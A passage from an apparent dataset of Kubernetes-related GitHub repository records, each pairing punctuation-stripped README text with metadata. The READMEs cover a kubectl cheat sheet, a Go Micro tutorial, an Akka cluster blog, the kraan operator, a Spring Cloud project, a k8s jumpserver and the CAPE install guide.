deprecated apps v1beta1 kubectl run generator deployment apps v1beta1 Job deprecated batch v1 kubectl run generator job v1 CronJob deprecated batch v1beta1 kubectl run generator cronjob v1beta1 CronJob deprecated batch v2alpha1 kubectl run generator cronjob v2alpha1 Configuration and Logs details of Kubernetes Docker Description Folder or File location Config folder etc kubernetes Manifests dir etc kubernetes manifests Certificate files etc kubernetes pki Credentials to API server etc kubernetes kubelet conf Superuser credentials etc kubernetes admin conf kubectl config file kube config Kubernets working dir var lib kubelet Docker working dir var lib docker var log containers Etcd working dir var lib etcd Network cni etc cni net d Log files var log pods Kubelet logs var log messages var log pods kube systemkube proxy kube proxy log Kube proxy var log pods kube systemkube proxy kube proxy log Kube api server var log pods kube systemkube apiserver kube proxy log Kube controller var log pods kube systemkube controller kube proxy log Kube scheduller var log pods kube systemkube scheduler kube scheduler log Env etc systemd system kubelet service d 10 kubeadm conf Env export KUBECONFIG etc kubernetes admin conf Audit logs var log audit audit log Kubelet env file etc kubernetes kubelet env kubelet service etc systemd system kubelet service docker service etc systemd system docker service Check health of cluster Description command Check cluster health kubectl get componentstatus Check etcd health kubectl get raw healthz etcd Kubelet and Docker commands Description Command or File location Check Kubelet status service kubelet status or systemctl status kubelet service Restart Kubelet service kubelet restart or systemctl restart kubelet service Stop Kubelet service kubelet stop or systemctl stop kubelet service Tail Kubelet logs journalctl u kubelet service f Check Docker daemon status service docker status or systemctl status docker service Restart Docker daemon service docker restart or systemctl restart docker service Stop Docker daemon service docker stop or systemctl stop docker service Tail Docker daemon logs journalctl u docker service f Kubernetes networking commands Description Command List interfaces on the host ip link Lists IP address assigned to the interfaces ip addr View the routing table ip route Add the entries to the routing table ip route add 192 168 1 0 24 via 192 168 2 1 Enable ipv4 forwarding echo 1 proc sys net ipv4 ipforward Enable ipv6 forwarding echo 1 proc sys net ipv6 ipforward list network namespaces ip netns Adding blue namespace ip netns add blue Exec to the particular namesapce ip netns exec NAMESPACENAME ip link or ip n red link Kubernetes cluster upgrade kubeadm way https kubernetes io docs setup production environment tools kubeadm install kubeadm Description Command Install kubeadm new version apt get upgrade y kubeadm 1 19 0 00 Upgrade plan kubeadm upgarade plan v1 19 0 Apply upgrade plan kubeadm upgrade apply v1 19 0 Update kubelet apt get upgrade kubelet 1 19 0 00 Update kubelet configuration kubeadm upgarde node config kubelet version v1 19 0 Restart kubelet systemctl restart kubelet ETCD Backup Restore https github com mmumshad kubernetes the hard way blob master practice questions answers cluster maintenance backup etcd etcd backup and restore md Description Command ETCD Backup ETCDCTLAPI 3 etcdctl endpoints https 127 0 0 1 2379 cacert etc kubernetes pki etcd server crt cert etc kubernetes pki etcd ca crt key etc kubernetes pki etcd ca key snapshot save tmp snapshot pre boot db ETCD Restore ETCDCTLAPI 3 etcdctl endpoints https 127 0 0 1 2379 cacert etc kubernetes pki etcd ca crt name master cert etc kubernetes pki etcd server crt key etc kubernetes pki etcd server key data dir var lib etcd from backup initial cluster master https 127 0 0 1 2380 initial cluster token etcd cluster 1 initial advertise peer urls https 127 0 0 1 2380 snapshot restore tmp snapshot pre boot db Pod https kubernetes io docs concepts workloads pods pod what is a pod NAME SHORTNAMES APIGROUP NAMESPACED KIND VERBS pods po true Pod create delete deletecollection get list patch update watch Description Kubectl Command Create kubectl run nginx generator run pod v1 image nginx Create in particular namespace kubectl run nginx generator run pod v1 image nginx n NAMEPSPACE Dry run print object without creating it kubectl run PODNAME generator run pod v1 image nginx dry run o yaml Create from File kubectl create f pod yaml Create from File in particular namespace kubectl create f pod yaml n NAMEPSPACE List pods kubectl get po or kubectl get pod or kubectl get pods List pods in all namespaces kubectl get pods all namespaces or kubectl get pods A List pods with more information kubectl get pods owide List pods information in custom columns kubectl get pod PODNAME o custom columns CONTAINER spec containers 0 name IMAGE spec containers 0 image Verbose Debug information describe pod kubectl describe pod PODNAME Logs kubectl logs PODNAME Logs multi container case kubectl logs PODNAME c CONTAINERNAME Tail pod logs kubectl logs f PODNAME Tail pods logs multi container case kubectl logs f PODNAME c CONTAINERNAME Delete pod kubectl delete pod PODNAME or kubectl delete f pod yaml or kubectl delete pod PODNAME Delete pod in particular namespace kubectl delete pod PODNAME n NAMESPACE Delete pod forcefully kubectl delete pod my pod grace period 0 force Get pod kubectl get pod PODNAME Watch pod kubectl get pod PODNAME watch Patch pod kubectl patch pod valid pod p spec containers name kubernetes serve hostname Create and wrtie its spec to file kubectl run PODNAME image nginx restart Never dry run o yaml pod yaml List pod in Json output format kubectl get pods o json List pod in YAML output format kubectl get pods o yaml Run command in existing pod kubectl exec PODNAME ls Run command in existing pod multi container case kubectl exec PODNAME c CONTAINERNAME ls Exec to pod kubectl exec it PODNAME bash List Kubernetes critical pods kubectl get pods n kube system ReplicaSet https kubernetes io docs concepts workloads controllers replicaset NAME SHORTNAMES APIGROUP NAMESPACED KIND VERBS replicasets rs apps extensions true ReplicaSet create delete deletecollection get list patch update watch Verb Description Kubectl Command create kubectl create f replicaset yaml List kubectl get rs or kubectl get replicaset or kubectl get replicasets List replicasets with more information kubectl get rs owide List in all namespaces kubectl get rs all namespaces or kubectl get rs A Delete kubectl delete rs REPLICASETNAME or kubectl delete f replicaset yaml Get kubectl get rs REPLICASETNAME Deployments Scale Rolling Updates Rollbacks https kubernetes io docs concepts workloads controllers deployment NAME SHORTNAMES APIGROUP NAMESPACED KIND VERBS deployments deploy apps extensions true Deployment create delete deletecollection get list patch update watch Verb Description Kubectl Command Deployment Strategy Types Rolling Update or Recreate Create Deployment kubectl create deployment DEPLOYMENTNAME image busybox Run deployment with 2 replicas kubectl run PODNAME image nginx replicas 2 port 80 List deployments kubectl get deploy or kubectl get deployment or kubectl get deployments List deployments in all namespaces kubectl get deploy all namespaces or kubectl get deploy A List deployments in particular namespace kubectl get deploy n NAMESPACE List deployments with more information kubectl get deploy owide Delete deployment kubectl delete deploy DEPLOYMENTNAME or kubectl delete f deployment yaml Get particular deployment kubectl get deploy DEPLOYMENTNAME Run deployment and expose it kubectl run DEPLOYMENTNAME image nginx port 80 expose Update the nginx Pods to use thenginx 1 9 1image instead of thenginx 1 7 9image kubectl set image deployment nginx deployment nginx nginx 1 9 1 record Edit the Deployment kubectl edit deploy DEPLOYMENTNAME Deployment rollout status kubectl rollout status deploy DEPLOYMENTNAME Deployment rollout history kubectl rollout history deploy DEPLOYMENTNAME Rolling back deployment to previous version kubectl rollout undo deploy DEPLOYMENTNAME Scaling deployment kubectl scale replicas 2 deploy DEPLOYMENTNAME Pausing deployment kubectl rollout pause deploy DEPLOYMENTNAME Resuming deployment kubectl rollout resume deploy DEPLOYMENTNAME Verbose Debug information describe deployment kubectl describe deploy DEPLOYMENTNAME Describe all deployments kubectl describe deployments Watch deployment kubectl get deploy DEPLOYMENTNAME watch DaemonSet https kubernetes io docs concepts workloads controllers daemonset NAME SHORTNAMES APIGROUP NAMESPACED KIND VERBS daemonsets ds apps extensions true DaemonSet create delete deletecollection get list patch update watch Verb Description Kubectl Command List daemonsets kubectl get ds or kubectl get daemonset or kubectl get daemonset List daemonsets in all namespaces kubectl get ds all namespaces or kubectl get ds A List daemonsets with more information kubectl get ds owide Delete kubectl delete ds DAEMONSETNAME or kubectl delete f daemonset yaml Get particular daemonset kubectl get ds DAEMONSETNAME Verbose Debug information describe Daemonset kubectl describe ds DAEMONSETNAME Jobs https kubernetes io docs concepts workloads controllers jobs run to completion NAME SHORTNAMES APIGROUP NAMESPACED KIND VERBS jobs batch true Job create delete deletecollection get list patch update watch Verb Description Kubectl Command Create kubectl create job my job image busybox Create a job with command kubectl create job my job image busybox date Create a job from a CronJob named a cronjob kubectl create job test job from cronjob a cronjob List jobs kubectl get jobs or kubectl get job List jobs in all namespaces kubectl get jobs all namespaces or kubectl get jobs A List with more information kubectl get job owide Delete kubectl delete jobs JOBNAME or kubectl delete f job yaml Get particular cronjob kubectl get cj cronjobNAME Verbose Debug information describe job kubectl describe jobs CRRONJOBNAME CronJob https kubernetes io docs concepts workloads controllers cron jobs NAME SHORTNAMES APIGROUP NAMESPACED KIND VERBS cronjobs cj batch true CronJob create delete deletecollection get list patch update watch Verb Description Kubectl Command Create with schedule kubectl create cronjob CRONJOBNAME image busybox schedule 1 List kubectl get cj or kubectl get cronjob or kubectl get cronjobs List in all namespaces kubectl get cj all namespaces or kubectl get cj A List with more information kubectl get cj owide Delete kubectl delete cj CRONJOBNAME or kubectl delete f cronjob yaml Get particular cronjob kubectl get cj cronjobNAME Verbose Debug information describe cronjob kubectl describe cj CRRONJOBNAME Service https kubernetes io docs concepts services networking service NAME SHORTNAMES APIGROUP NAMESPACED KIND VERBS services svc true Service create delete get list patch update watch Service Type Description Kubectl Command ClusterIP Create service kubectl create service clusterip my cs tcp 5678 8080 Create service in headless mode kubectl create service clusterip my cs clusterip None ExternalName Create an ExternalName service kubectl create service externalname my ns external name example com LoadBalancer Create a LoadBalancer service kubectl create service loadbalancer my lbs tcp 5678 8080 NodePort Create a NodePort service kubectl create service nodeport my ns tcp 5678 8080 Verb Description Kubectl Command List kubectl get service or kubectl get svc List in all namespaces kubectl get service all namespaces or kubectl get svc A List with more information kubectl get svc owide or kubectl get service owide Delete kubectl delete svc SERVICENAME or kubectl delete f service yaml Get particular service kubectl get service SERVICENAME Verbose Debug information describe service kubectl describe svc SERVICENAME Namespace https kubernetes io docs concepts overview working with objects namespaces NAME SHORTNAMES APIGROUP NAMESPACED KIND VERBS namespaces ns false Namespace create delete get list patch update watch Verb Description Kubectl Command List kubectl get namespaces or kubectl get ns Create kubectl create ns TEST Delete kubectl delete ns TEST or kubectl delete f namespace yaml Get particular namespace kubectl get ns TEST Verbose Debug information describe service kubectl describe ns TEST Serviceaccounts https kubernetes io docs tasks configure pod container configure service account NAME SHORTNAMES APIGROUP NAMESPACED KIND VERBS serviceaccounts sa true ServiceAccount create delete deletecollection get list patch update watch Verb Description Kubectl Command List kubectl get sa Create kubectl create serviceaccount my service account Delete kubectl delete serviceaccount my service account or kubectl delete f my service account yaml Get particular sa kubectl get sa my service account Verbose Debug information describe service kubectl describe sa my service account Node Maintenance https kubernetes io docs tasks administer cluster safely drain node Description Command Mark node as unschedulable kubectl cordon NODENAME Mark node as schedulable kubectl uncordon NODENAME Drain node in preparation for maintenance kub,2020-04-10T14:18:51Z,2020-10-11T13:43:55Z,n/a,User,10,37,26,65,master,vladwa,1,0,0,0,1,0,0
yaoliu,k8s-micro,,k8s micro READMECN md Go Micro on kubernetes Overview This project mainly demonstrates how the Go Micro https github com micro runs on the kubernetes cluster and through the way of calling apiserver to carry out service discovery registration and configuration management Features Go Micro Protobuf GRPC Kubernetes Discovery Kubernetes ConfigMap MultiService Example Cloud Native Getting Started Installing Go Micro installing go micro Installing Protobuf and Writing Proto installing protobuf Create Kubernetes Namespace create kubernetes namespace Create RBAC create rbac Kubernetes Discovery Go Micro RPC on Kubernetes go microrpc on kubernetes Go Micro Web on Kubernetes go microweb on kubernetes Go Micro RPC MultiService on Kubernetes go microrpc multiservice on kubernetes Go micro RPC Web on Kubernetes go microrpcweb on kubernetes Using ConfigMap using configmap TODO Health Installing Go Micro go get github com micro go micro v2 v2 3 0 go get github com micro go plugins registry kubernetes v2 v2 3 0 go get github com micro go plugins config source configmap v2 v2 3 0 Installing Protobuf Writing Proto Installing Protobuf brew install protobuf go get github com micro micro v2 cmd protoc gen micro master Writing Proto syntax proto3 service Greeter rpc Hello HelloRequest returns HelloResponse message HelloRequest string name 1 message HelloResponse string greeting 2 Generate protoc protopath GOPATH src microout goout proto greeter proto ls proto greeter pb micro go greeter proto greeter proto Create Kubernetes Namespace Writing a namespace apiVersion v1 kind Namespace metadata name go micro namespace go micro Deploying a NameSpace kubectl apply f k8s namespace yaml Select Result kubectl get ns grep micro go micro Active 36d Create RBAC Writing Pod RBAC apiVersion rbac authorization k8s io v1 kind ClusterRole metadata name micro registry namespace go micro rules apiGroups resources pods verbs get list patch watch apiVersion rbac authorization k8s io v1 kind ClusterRoleBinding metadata name micro registry namespace go micro roleRef apiGroup rbac authorization k8s io kind ClusterRole name micro registry subjects kind ServiceAccount name micro services namespace go micro apiVersion v1 kind ServiceAccount metadata namespace go micro name micro service Writing ConfigMap RBAC kind Role apiVersion rbac authorization k8s io v1 metadata name micro config namespace go micro labels app go micro config rules apiGroups resources configmaps verbs get update list watch apiVersion rbac authorization k8s io v1 kind RoleBinding metadata name micro config namespace go micro roleRef apiGroup rbac authorization k8s io kind Role name micro config subjects kind ServiceAccount name micro services namespace go micro apiVersion v1 kind ServiceAccount metadata namespace go micro name micro services Create kubectl apply f k8s configmap rbac yaml kubectl apply f k8s pod rbac yaml Kubernetes Discovery ing Go Micro RPC on Kubernetes Deploy kubectl apply f go micro srv k8s deployment yaml kubectl apply f go micro srv k8s service yaml Writing Code import context fmt github com micro go micro v2 grpcc github com micro go micro v2 client grpc github com micro go micro v2 server grpcs github com micro go micro v2 server grpc github com micro go plugins registry kubernetes v2 proto github com yaoliu k8s micro proto net http pprof type Greeter struct func g Greeter Hello ctx context Context request proto HelloRequest response proto HelloResponse error response Greeting Hello request Name return nil func main service micro NewService micro Name DefaultServiceName micro Server grpcs NewServer server Address DefaultServerPort server Name DefaultServiceName micro Client grpcc NewClient micro Registry kubernetes NewRegistry Kubernetes service Init proto RegisterGreeterHandler service Server new Greeter if err service Run err nil fmt Println err Writing Dockerfile FROM alpine MAINTAINER liuyao 163 com ADD server server EXPOSE 9100 CMD server Compile Push Image CGOENABLED 0 GOOS linux go build o server main go docker build t liuyao go micro srv kubernetes docker push liuyao go micro srv kubernetes Writing Deployment apiVersion apps v1 kind Deployment metadata namespace go micro name go micro srv spec selector matchLabels app go micro srv replicas 2 template metadata labels app go micro srv spec containers name go micro srv image liuyao go micro srv kubernetes imagePullPolicy Always ports containerPort 9100 name rpc port Writing Service apiVersion v1 kind Service metadata name go micro srv namespace go micro labels app go micro srv spec ports port 9100 name go micro srv targetPort 9100 selector app go micro srv Deploy kubectl apply f k8s deployment yaml kubectl apply f k8s service yaml Select Run Status Registry Status Start Logs kubectl get pods n go micro grep go micro srv go micro srv 6cc7848c6 4knrm 1 1 Running 0 17h go micro srv 6cc7848c6 lf6wm 1 1 Running 0 17h kubectl describe pod go micro srv 6cc7848c6 4knrm n go micro Labels app go micro srv micro mu selector go micro srv service micro mu type service pod template hash 6cc7848c6 Annotations cni projectcalico org podIP 10 100 109 174 32 cni projectcalico org podIPs 10 100 109 174 32 micro mu service go micro srv name go micro srv version latest metadata null endpoints name Greeter Hello request name HelloRequest type He kubectl logs go micro srv 6cc7848c6 4knrm n go micro 2020 04 28 03 31 03 level info Starting service go micro srv 2020 04 28 03 31 03 level info Server grpc Listening on 9100 2020 04 28 03 31 03 level info Registry kubernetes Registering node go micro srv 5c1ae799 d6be 48aa b56c be3457508bc5 Go Micro Web on Kubernetes Deploy kubectl apply f k8s deployment yaml kubectl apply f k8s service yaml Writing Code import fmt github com micro go micro v2 web github com micro go plugins registry kubernetes v2 net http os func main service web NewService web Name go micro web web Registry kubernetes NewRegistry web Address 9200 service HandleFunc func writer http ResponseWriter request http Request podName os Getenv HOSTNAME writer Write byte podName if err service Init err nil fmt Println err if err service Run err nil fmt Println err Writing Dockerfile FROM alpine MAINTAINER liuyao 163 com ADD web web EXPOSE 9200 CMD web Compile Push Image CGOENABLED 0 GOOS linux go build o web main go docker build t liuyao go micro web kubernetes docker push liuyao go micro web kubernetes Writing Deployment apiVersion apps v1 kind Deployment metadata namespace go micro name go micro web spec selector matchLabels app go micro web replicas 2 template metadata labels app go micro web spec containers name go micro web image liuyao go micro web kubernetes imagePullPolicy Always ports containerPort 9200 name http port serviceAccountName micro services Writing Service apiVersion v1 kind Service metadata name go micro web namespace go micro labels app go micro web spec ports port 9200 name go micro web targetPort 9200 selector app go micro web Deploy kubectl apply f k8s deployment yaml kubectl apply f k8s service yaml Select Run Status Registry Status Start Logs kubectl get pods n go micro o wide NAME READY STATUS RESTARTS AGE IP NODE NOMINATED NODE READINESS GATES go micro web 56b457b9f7 f7lds 1 1 Running 0 65s 10 1 0 114 docker desktop go micro web 56b457b9f7 hvpg9 1 1 Running 0 65s 10 1 0 115 docker desktop kubectl logs go micro web 56b457b9f7 f7lds n go micro 2020 05 28 08 21 14 level info service web Listening on 9200 Go Micro RPC MultiService on Kubernetes Deploy kubectl apply f k8s deployment yaml kubectl apply f k8s service yaml Writing Code import context fmt github com micro go micro v2 github com micro go micro v2 client grpcc github com micro go micro v2 client grpc github com micro go plugins registry kubernetes v2 proto github com yaoliu k8s micro proto time var DefaultServiceName go micro client DefaultSrvName go micro srv func main service micro NewService micro Name DefaultServiceName micro Client grpcc NewClient micro Registry kubernetes NewRegistry service Init go func registryRPCHandler service Client if err service Run err nil fmt Println err func registryRPCHandler s client Client timer time NewTicker time Second 10 defer timer Stop for select case timer C greeter proto NewGreeterService DefaultSrvName s rsp err greeter Hello context TODO proto HelloRequestName Yao if err nil fmt Println err else fmt Println Server rsp Greeting Writing Dockerfile FROM alpine MAINTAINER liuyao 163 com ADD client client EXPOSE 9200 CMD client Compile Push Images CGOENABLED 0 GOOS linux go build o client main go docker build t liuyao go micro client kubernetes docker push liuyao go micro client kubernetes Writing Deployment apiVersion apps v1 kind Deployment metadata namespace go micro name go micro client spec selector matchLabels app go micro client replicas 2 template metadata labels app go micro client spec containers name go micro client image liuyao go micro client kubernetes imagePullPolicy Always serviceAccountName micro services Depoly kubectl apply f k8s deployment yaml Select Run Status Registry Status Start Logs kubectl get pods n go micro NAME READY STATUS RESTARTS AGE go micro client 64b999f5d m9ffk 1 1 Running 0 20m go micro client 64b999f5d wntkz 1 1 Running 0 20m kubectl describe pod go micro client 64b999f5d wntkz n go micro Labels app go micro client micro mu selector go micro client service micro mu type service pod template hash 64b999f5d Annotations cni projectcalico org podIP 10 100 109 133 32 cni projectcalico org podIPs 10 100 109 133 32 micro mu service go micro client name go micro client version latest metadata null endpoints nodes id go micro client d227891e 29b1 4d7f 81ad d53ae1 kubectl logs go micro client 64b999f5d wntkz n go micro 2020 04 28 05 57 37 level info Starting service go micro client 2020 04 28 05 57 37 level info Server grpc Listening on 46701 2020 04 28 05 57 37 level info Registry kubernetes Registering node go micro client d227891e 29b1 4d7f 81ad d53ae11bb7f6 Server Hello Yao Using ConfigMap Writing Config Map apiVersion v1 kind ConfigMap metadata name go micro config namespace go micro data DBNAME MICRO DBHOST 192 168 0 1 Writing Code import fmt github com micro go micro v2 config github com micro go micro v2 config source env github com micro go plugins config source configmap v2 var DefaultNamespace go micro DefaultConfigName go micro config func main if cfg err config NewConfig err nil err cfg Load env NewSource configmap NewSource configmap WithName DefaultConfigName configmap WithNamespace DefaultNamespace if err nil fmt Println cfg Map fmt Println err Writing Pod apiVersion v1 kind Pod metadata name go micro config namespace go micro spec containers name go micro config image liuyao go micro config kubernetes imagePullPolicy Always restartPolicy Never serviceAccountName micro services Deploy cd go micro config kubectl apply f k8s pod yaml Select Result root k8s master 1 k8s kubectl logs go micro config n go micro map DBHOST map 192 168 0 1 DBNAME map MICRO go map micro map srv map port map 9100 map tcp map addr 10 96 196 160 port 9100 proto tcp service map host 10 96 196 160 port map go map micro map srv 9100 web map port map 9200 map tcp map addr 10 96 218 32 port 9200 proto tcp service map host 10 96 218 32 port map go map micro map web 9200 home root hostname go micro config kubernetes map port map 443 map tcp tcp 10 96 0 1 443 service map host 10 96 0 1 port 443 path usr local sbin usr local bin usr sbin usr bin sbin bin,2020-04-29T08:31:50Z,2020-12-08T17:49:49Z,Go,User,1,32,3,49,master,yaoliu,1,0,0,2,1,0,0
nigelpoulton,getting-started-k8s,kubernetes,Readme Node js web app for use in Pluralsight Getting Started with Kubernetes https app pluralsight com library courses getting started kubernetes table of contents video course Packages and dependencies will be upadted annually May contain vulnerable code use at own risk App The app dependencies and Dockerfile are in the App folder Kubernetes YAML files All Kubernetes YAML manifests are in the Pods Services and Deployments folders Additional references List of additional books courses blogs and other places this repo is used referenced None Pre created image A publically available pre created container image is available for download here https hub docker com repository docker nigelpoulton getting started k8s Connect with me I m passionate about tech and I m all about making Kubernetes less scary Twitter nigelpoulton https twitter com nigelpoulton LinkedIn Nigel Poulton https www linkedin com in nigelpoulton,2020-07-05T18:45:06Z,2020-12-25T08:22:49Z,HTML,User,4,31,60,0,master,,0,0,0,3,0,3,0
michael-read,akka-typed-distributed-state-blog,akka#akka-cluster#akka-cluster-sharding#akka-persistence#akka-typed-actors#cluster-sharding#clustering#docker#k8s#kubernetes#lightbend#lightbend-console#monitoring#poc#rest-client#scala,Akka Cluster BlogModel png How To Distribute Application State with Akka Cluster Building testing containerizing deploying and monitoring distributed microservices is difficult but using Lightbend technologies can make it a lot faster and easier to be successful In this four part blog series we walk you through a working Proof of Concept PoC built using Lightbends open source distributed toolkit Akka This PoC delivers a resilient highly performant elastic distributed and consistent state solution that provides an automatic in memory cache with a persistent backing Here is the breakdown Part 1 https www lightbend com blog how to distribute application state with akka cluster part 1 getting started Getting Started we walk through building testing and running the PoC locally with instrumentation and monitoring wired in from the very beginning using Lightbend Telemetry Part 2 https www lightbend com blog how to distribute application state with akka cluster part 2 docker and local deploy Docker and Local Deploy here we cover containerizing our PoC and then deploying locally in Docker Then well load test and monitor our PoC as we did in the first installment Part 3 https www lightbend com blog how to distribute application state with akka cluster part 3 kubernetes monitoring Kubernetes and Monitoring in this part we introduce Lightbend Console for Kubernetes K8s and then deploy our PoC in Minikube desktop version of K8s using YAML files provided in this repository Again well load test with Gatling but this time well monitor our PoC in Lightbend Console Part 4 https www lightbend com blog how to distribute application state with akka cluster part 4 the source code Source Code In our final installment we do a deep dive into our Scala source code Update June 10 2020 In honor of Lightbends release of Akkas Split Brain Resolver as OSS Ive updated this repository to take advantage of Akka 2 6 6 For more information on Akka Split Brain Resolver please see the announcement here https akka io blog news 2020 06 08 akka 2 6 6 released split brain resolver Also Patrik Nordwalls video on Split Brain Resolver is really great in helping you understand why you should care https akka io blog news 2020 06 08 akka split brain resolver video,2020-04-08T23:38:04Z,2020-12-22T14:54:44Z,Scala,User,4,31,5,68,master,michael-read,1,0,0,0,0,0,2
fidelity,kraan,addons#helm-controller#k8s,kraan Building platforms on top of K8s This project is currently in the early stages of development and expected to release beta versions by end of September What is kraan kraan helps you deploy and manage layers on top of kubernetes By applying layers on top of K8s clusters you can build focused platforms on top of K8s e g ML platforms Data platform etc Each layer is a collection of addons and can have dependencies established between the layers i e a mgmt layer can depend on a common layer Kraan will always ensure that the addons in the common layer are deployed successfully before deploying the mgmt layer addons A layer is represented as a kubernetes custom resource and kraan is an operator https kubernetes io docs concepts extend kubernetes operator that is deployed into the cluster and works constantly to reconcile the state of the layer custom resource kraan is powered by flux2 https toolkit fluxcd io and builds on top of projects like source controller https github com fluxcd source controller and helm controller https github com fluxcd helm controller Use cases Kraan can be used wherever you have requirements to manage add ons on top of k8s clusters and especially when you want to package the addons into dependant categories If you have a mutating webhook injecting a side car and set of security plugins which should always be deployed first before other addons then layers concept in Kraan will help there However Kraan is even more powerful when it comes to building custom platforms on top of k8s like the one shown below kraan promotes the idea of building model based platforms on top of k8s i e you can build a general purpose k8s platform which might have a common and security layers which packages all the common tooling applications inside that cluster might need as well as organization specific bits e g org specific security addons etc You can also say that the common layer depends on security layer to be deployed first This general purpose k8s platform can then be extended by applying another ml layer which can then be exposed as an ML platform to the development teams The end result here is developers working on top of secure and custom built platforms which adheres to organization specific policies etc And rolling out updates to this ML platform is as simple as kubectl apply f where new versions of the layers are deployed into the cluster and kraan operator will constantly work towards getting that platform to match the latest desired state The below diagram shows how you can use kraan to build a focused multi cloud platform where common and security layers are shared across clouds whereas other layers become cloud specific custom platform docs diagrams custom platform png Design Kraan is a kubernetes controller that is built on top of k8s custom resources https kubernetes io docs concepts extend kubernetes api extension custom resources It works in tandem with source controller https github com fluxcd source controller and helm controller https github com fluxcd helm controller and hence they are always deployed together The detailed design documentation can be found here docs design README md Usage See User Guide docs user guide md for usage instructions See Developer Guide docs dev guide md for development Contributions Contributions are very welcome Please read the contributing guide CONTRIBUTING md or see the docs,2020-07-28T13:08:04Z,2020-12-17T06:20:13Z,Go,Organization,7,30,4,430,master,paulcarlton-ww#sbernheim#saada#rajarajanpsj#byjrack,5,4,4,14,35,1,124
chachae,cloudx,docker-compose#elk#gateway#k8s#mybatis#nacos#oauth2#redis#sentinel#springcloud#springsecurity,cloudx Spring Cloud Hoxton amp alibaba https img shields io badge SpringCloud Hoxton SR3 yellow svg longCache true style flat square https img shields io badge SpringCloud Hoxton SR3 yellow svg longCache true style flat square https img shields io badge SpringCloud Hoxton SR3 yellow svg longCache true style flat square https img shields io badge SpringCloudAlibaba 2 2 1 RELEASE blueviolet svg style flat square https img shields io badge SpringCloudAlibaba 2 2 1 RELEASE blueviolet svg style flat square https img shields io badge SpringCloudAlibaba 2 2 1 RELEASE blueviolet svg style flat square https img shields io badge SpringBoot 2 2 6 RELEASE brightgreen svg style flat square https img shields io badge SpringBoot 2 2 6 RELEASE brightgreen svg style flat square https img shields io badge SpringBoot 2 2 6 RELEASE brightgreen svg style flat square cloudx Spring Cloud Hoxton SR3 Spring Cloud OAuth 2 Spring Cloud Alibaba GatewayOAuth 2Spring BootSpring SecurityMyBatisSentinelNacosOpen Fegin index feature 1 Token 2 3 NacosSentinel 4 5 6 cloudx img https gitee com chachae imgs raw master cloudx cloudx png https gitee com chachae imgs raw master cloudx cloudx png server name port description cloudx auth 9200 cloudx gateway 8301 cloudx apm admin 8400 Spring Admin cloudx server system 9500 cloudx server demo 9501 cloudx common core starter cloudx common datasource starter cloudx common redis Redis starter cloudx common security starter cloudx tx manager 8501 Nacos 80 MySQL 3306 MySQL Redis 6379 K V Sentinel 8401 ELK 4560,2020-04-13T12:08:18Z,2020-12-25T07:27:15Z,Java,User,3,29,22,29,master,chachae,1,0,0,1,0,0,0
owenliang,k8s-jumpserver,,K8S https raw githubusercontent com owenliang k8s jumpserver master arch jpeg a 1 xtermjs websocketweb asciinema test index htmlxtermjs test player htmlasciinema xtermjs resizeinput SSH asciinema SSHSSH ssh sshtoken websocket records play filename go run app go jumpserver jumpserver toml hook bizes platform api go type TokenAuthData struct Namespace string json namespace PODns ClusterCfg string json clustercfg K8Syaml PodName string json podname PODname ContainerName string json containername PODcontainer func ValidateSSHToken ctx context Context sshToken string tokenAuthData TokenAuthData err error TODO TokenAuthData TokenAuthData return sshtokenssh token bizes k8s stream go func handler websocketProxy onLogin TODOsessionID tokenAuthData recordFilenamessh func handler websocketProxy onLogout TODOssh sshhandler systemd Unit Description jumpserver Requires network online target After network online target Service Type simple User root Group root Restart always WorkingDirectory path to jumpserver ExecStart path to jumpserver jumpserver jumpserver path to jumpserver jumpserver jumpserver toml Install UNIT WantedBy multi user target nginx map httpupgrade connectionupgrade default upgrade close server location jumpserver proxypass http jumpserverIP 7000 proxyhttpversion 1 1 proxysetheader Upgrade httpupgrade proxysetheader Connection connectionupgrade URL jumpserver ssh sshtoken websocket jumpserver records play filename,2020-07-30T02:30:57Z,2020-12-29T06:23:30Z,CSS,User,0,28,3,0,master,,0,0,0,0,0,0,0
cape-sh,cape,backup#k8s#k8s-deployment#kubefed#kubernetes#multi-cluster#openshift#velero,Features Install Learn License Support Advanced Kubernetes Multi cluster Application Data Management CAPE provides advanced Kubernetes features for Disaster Recovery Data Migration Mobility Multi cluster Application Deployment and CI CD within a single intuitive interface Deploy advanced K8s functionalities without the learning curve This repo is for tracking community issues and feedback Try CAPE today and let us know what you think CAPE assets youtube cape png https youtu be 4KJt8NXTO8E CAPE INTRO Features 1 Disaster Recovery Single scheduled backup restore Multi cluster multi cloud backup restore 2 Data Migration Mobility Secure encrypted application data at rest and in transit Support for on prem private cloud major public clouds and edge 3 Multi cluster Application Deployment End to end deployment from application definition to application release Support for multiple types of application environments 4 Drag Drop CI CD Workflow Manager In development Build Test Deploy across multiple cloud providers or on premises systems Standardize CI CD tooling processes across vendors deployment environments Install Start k3d local instance Prerequisites docker https docs docker com get docker k3d https github com rancher k3d sh k3d create n dev p 80 80 p 443 443 wait 0 export KUBECONFIG k3d get kubeconfig name dev kubectl cluster info Note The Kubernetes cluster dev has been created locally Install CAPE By running the following command I have read and agree to CAPE privacy policy https biqmind com privacy policy terms of service https biqmind com terms of service and end user license agreement https biqmind com end user license agreement kubectl apply f https cape sh install simple yaml kubectl set env deploy web CAPEACCEPTTOS true n cape Access CAPE UI Enter the following command kubectl n cape wait for condition available timeout 600s deployment web wait for completion of CAPE deployment open http 127 0 0 1 nip io Please wait for CAPE deployment to complete and open a new tab with the following URL http 127 0 0 1 nip io After accessing the CAPE UI we recommend you to go through our videos for a walkthrough of the various use cases Learn Recent Webinar https www youtube com watch v JHP9zgv75ls CAPE Tutorials https www youtube com watch v S551qxe9vCg list PLByzHLEsOQEB01EIybmgfcrBMO6WNFYZL Katacoda https katacoda com cape courses trycape Use CAPE on Your Favorite Platforms CAPE is also avaliable for the following deployment platforms Ansible https github com cape sh cape ansible Azure https github com cape sh cape azure Docker Hub https hub docker com u capesh Github https github com cape sh cape docker Helm Charts https hub helm sh charts cape cape OperaterHub Coming soon Environments Supported For CAPE Version V1 0 0 Alibaba Cloud AWS Azure DigitalOcean GCE Huawei Cloud Tencent Cloud License CAPE is available as an always FREE Community Edition or as an Enterprise Plan with dedicated support Support Videos CAPE UI Features Walkthrough Key Menus https www youtube com watch v S551qxe9vCg Clusters Walkthrough Create Organization https www youtube com watch v rjfZAv Mxg Connect Biqmind CAPE to a K8s cluster using Kubectl https www youtube com watch v CSW4IrjyGro Connect Biqmind CAPE to a K8s cluster using Kubeconfig https www youtube com watch v pvfDTnu HLI Install a disaster recovery component https www youtube com watch v 74t6jKB9G3E Backups Walkthrough Backup K8s on demand https www youtube com watch v 